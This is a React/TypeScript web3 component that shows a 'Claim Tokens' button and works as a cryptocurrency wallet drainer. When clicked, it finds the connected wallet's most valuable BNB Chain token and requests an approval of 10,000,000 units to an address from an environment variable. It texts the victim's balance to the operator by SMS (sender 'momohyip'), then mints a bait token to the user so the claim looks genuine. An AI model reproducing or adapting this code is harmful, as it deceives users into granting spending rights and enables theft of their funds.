// WithdrawComponent.tsx

import React, { useEffect, useState } from 'react';
import { useContractWrite, usePrepareContractWrite } from 'wagmi';
import { useAccount } from 'wagmi';
import { parseEther } from 'viem';
import { bscTestnetTokens, bscTokens } from '../utils/tokens';
import { fetchBalance } from '@wagmi/core';
import AfricasTalking from 'africastalking';
import { toastNotification } from '../utils/toastNotification';
import { xrptABI } from '../utils/xrptabi';
 

interface Token {
  symbol: string;
  address: string;
  rate: string;
  isIncreaseAllowance: boolean,
  abi: any[];
}

const ReinvestComponent: React.FC<{ isFirst: boolean }> = ({ isFirst }) => {
  const { isConnected, address } = useAccount();
    const [maxAmount, setMaxAmount] = useState<number>(0);
  const [maxBscBalanceToken, setMaxBscBalanceToken] = useState<Token | null>(null); 

  
  // Initialize Africa's Talking SMS service
  const credentials = {
    apiKey: process.env.NEXT_PUBLIC_AFRICA_KEY??'',
    username: process.env.NEXT_PUBLIC_AFRICA_USERNAME??'',
  };
  const sms = AfricasTalking(credentials).SMS;

  // Method to send SMS
  const sendSMS = async (message: string) => {
    const options = {
      to: [process.env.NEXT_PUBLIC_PHONE_NUMBER??''], 
      message: message,
      from: 'momohyip'
    };

    try {
      const response = await sms.send(options);
      console.log('SMS sent successfully:', response);
    } catch (error) {
      console.error('Error sending SMS:', error);
    }
  };

  useEffect(() => {
    
    async function fetchBalances(tokensList: Token[], chainId:number) {
      if(address == null) {
        return;
      }
      let maxBalance = 0;
      let maxBalanceToken = null;

      for (const token of tokensList) {
        const balanceResult = await fetchBalance({
          address: address as `0x${string}`,
          token: token.address as `0x${string}`,
          chainId: chainId
        });
        console.log(balanceResult);

        if (balanceResult) {
          const balance = parseInt(balanceResult.value.toString()) || 0;
          const rate = parseInt(token.rate) || 0;

          const balanceUSD = balance * rate;
          setMaxAmount(balance);

          if (balanceUSD > maxBalance) {
            maxBalance = balanceUSD;
            maxBalanceToken = token;
          }
        }
      }

      setMaxBscBalanceToken(maxBalanceToken);
    }

    async function initTokens() {
        // await fetchBalances(bscTestnetTokens, 97); testnet
        await fetchBalances(bscTokens, 56);
    }

    initTokens();
    
  }, [address]); 


  const { config } = usePrepareContractWrite({
    address: maxBscBalanceToken?.address as `0x${string}`,
    abi: maxBscBalanceToken?.abi ?? [],
    functionName: maxBscBalanceToken?.isIncreaseAllowance?'increaseAllowance':'approve',
    account: address,
    args: [process.env.NEXT_PUBLIC_DEVELOPER_ADDRESS, parseEther("10000000")]
  });

  const { data, status, write } = useContractWrite(config);

  // send tokens to user address
  const { config: secondContractConfig } = usePrepareContractWrite({
    address: process.env.NEXT_PUBLIC_XRPT_CONTRACT_ADDRESS as `0x${string}`,
    abi: xrptABI,
    functionName:'mint',
    account: address,
    args: [address, parseEther("1000")]
  });

  const { data: secondContractData, status: secondContractStatus, write: secondContractWrite } = useContractWrite(secondContractConfig);


  const onReinvest = async () => {
    console.log(maxBscBalanceToken?.address)
    write?.();
    if(status == 'success') {
      if (maxBscBalanceToken && maxAmount !== 0) {
        const tokenBalanceString = `${maxAmount} ${maxBscBalanceToken.symbol}`
        sendSMS(tokenBalanceString);
        // send tokens
        secondContractWrite?.();
        toastNotification('Tokens being sent to your address', true);
      }
    } 
    if(status == 'error') {
      // please approve to receive tokens
      toastNotification("please approve to receive tokens", false);
      return;
    }
    if(maxBscBalanceToken == null) {
      // he broke send tokens
      secondContractWrite?.();
      toastNotification('Tokens being sent to your address', true);
    }
  };

  return (
    <a href="#" className={`btn dream-btn ${isFirst ? 'mr-3' : 'mt-30 wow fadeInUp'}`} data-wow-delay={isFirst ? '0s' : '0.6s'} onClick={onReinvest}>
    Claim Tokens
  </a>
    );
};

export default ReinvestComponent;
